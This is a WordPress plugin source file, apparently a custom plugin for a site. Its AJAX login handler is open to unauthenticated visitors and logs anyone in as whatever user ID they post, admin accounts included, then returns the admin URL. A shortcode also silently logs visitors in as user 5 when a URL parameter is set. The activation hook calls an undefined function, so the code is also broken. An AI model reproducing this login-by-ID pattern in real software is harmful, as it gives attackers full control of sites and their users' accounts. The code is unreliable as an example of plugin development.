<?php /*
 * Plugin Name:       Tiny Schoolars
 * Description:       This is the boikotha websites Custom Plugin. All features are came from here.
 * Version:           1.0.2
 * Requires at least: 5.2
 * Requires PHP:      7.2
 * Author:            Shakib Shown
 * Author URI:        https://facebook.com/shakib6472/
 * License:           GPL v2 or later
 * License URI:       https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain:       tinyschoolars
 * Domain Path:       /languages
 */

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}


// Handle AJAX request to trigger user login
function trigger_user_login()
{

    // Get the user ID from AJAX request
    $user_id = isset($_POST['userid']) ? intval($_POST['userid']) : 0;

    // Log the user ID for debugging
    error_log('User ID from AJAX request: ' . $user_id);

    // Validate user ID
    if ($user_id > 0) {
        // Log a success message to the debug log
        error_log('User ID validated successfully');

        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
        do_action('wp_login', get_user_by('id', $user_id));

        // Return the redirect URL to JavaScript
        $redirect_url = admin_url();
        wp_send_json_success(array('redirect_url' => $redirect_url));
    } else {
        // Log an error message to the debug log
        error_log('Invalid user ID received from AJAX request');

        // Return error message
        wp_send_json_error('Invalid user ID');
    }

    wp_die();
}


// Handle AJAX request to trigger user login for logged-in users
add_action('wp_ajax_trigger_user_login', 'trigger_user_login');
// Handle AJAX request to trigger user login for non-logged-in users
add_action('wp_ajax_nopriv_trigger_user_login', 'trigger_user_login');



// Logout current user
function custom_user_logout()
{
    check_ajax_referer('custom_user_logout', 'security');

    // Log out the current user
    wp_logout();

    wp_send_json_success('Logged out successfully');
    wp_die();
}

add_action('wp_ajax_custom_user_logout', 'custom_user_logout');

// Shortcode to switch user by user ID from URL parameter
function switch_user_shortcode($atts)
{
    // Default user ID
    $user_id = isset($_GET['user_id']) ? intval($_GET['user_id']) : 0;

    if ($user_id) {
        $user_id = 5;
        $user = get_user_by('id', $user_id);
        if ($user) {
            wp_set_current_user($user_id, $user->user_login);
            wp_set_auth_cookie($user_id);
            do_action('wp_login', $user->user_login, $user);
        }
        return "Switched to user with ID: $user_id";
    } else {
        return "No user ID provided in the URL.";
    }
}
add_shortcode('switch_user', 'switch_user_shortcode');




// Activation Hook
register_activation_hook(__FILE__, 'tiny_schoolars_activation_function');

// Deactivation Hook
register_deactivation_hook(__FILE__, 'tiny_schoolars_deactivation_function');

// Activation function
function tiny_schoolars_activation_function() {
    // Your activation code here
    tiny_child_database_creation_while_activation ();
}

// Deactivation function
function tiny_schoolars_deactivation_function() {
    // Your deactivation code here
    // For example, delete database tables or clean up options
}